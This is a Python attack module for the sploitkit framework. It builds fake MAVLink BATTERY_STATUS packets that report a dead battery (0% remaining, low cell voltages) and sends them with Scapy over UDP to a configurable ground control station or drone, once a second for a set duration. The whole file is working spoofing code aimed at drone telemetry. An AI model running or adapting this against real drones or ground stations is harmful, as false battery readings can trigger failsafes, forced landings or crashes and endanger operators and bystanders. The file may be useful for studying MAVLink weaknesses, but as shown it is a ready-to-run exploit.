from sploitkit import Module, Config, Option
from pymavlink import mavutil
from scapy.all import send, IP, UDP, Raw
import time
import sys

class BatterySpoofing(Module):
    """
    Spoof the drone's battery status to mislead the 
    Ground Control Station (GCS) into thinking the 
    battery is critically low or dead.
    """

    # Configuration for the spoofing module
    config = Config({
        Option(
            name='target_ip',
            description='IP of the target GCS or drone',
            required=True,
        ): "10.13.0.6",  # Default value
        Option(
            name='target_port',
            description='MavLink Port',
            required=True,
        ): "14550",  # Default value
        Option(
            name='duration',
            description='Duration of tampering in seconds',
            required=False,
        ): 10  # Default value
    })

    def create_battery_status(self):
        """
        Create a MAVLink BATTERY_STATUS message indicating a dead battery.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        battery_status = mav.battery_status_encode(
            id=0,  # Battery ID
            battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,  # Function of the battery
            type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,  # Type of battery
            temperature=300,  # Temperature in celsius * 10
            voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],  # Very low battery voltage of cells (in millivolts)
            current_battery=-1,  # Battery current in 10*milliamperes (-1 for not measured)
            current_consumed=5000,  # Consumed current in mAh (high value indicating usage)
            energy_consumed=10000,  # Consumed energy in 1/100th Joules (high value indicating usage)
            battery_remaining=0  # Remaining battery energy (0% - indicating dead battery)
        )

        return battery_status.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        """
        Send a MAVLink packet using Scapy.
        """
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)

    def run(self):
        # Retrieve the target IP, port, and duration from the config
        target_ip = self.config['target_ip']
        target_port = int(self.config['target_port'])
        duration = int(self.config['duration'])

        start_time = time.time()

        # Main spoofing loop
        while True:
            # Check if the duration has been reached
            if time.time() - start_time >= duration:
                self.logger.info(f"Tampering duration of {duration} seconds reached. Stopping...")
                break

            battery_status_packet = self.create_battery_status()

            self.send_mavlink_packet(battery_status_packet, target_ip, target_port)

            self.logger.info(f"Sent battery status packet to {target_ip}:{target_port}")
            time.sleep(1)  # Send packets at a regular interval
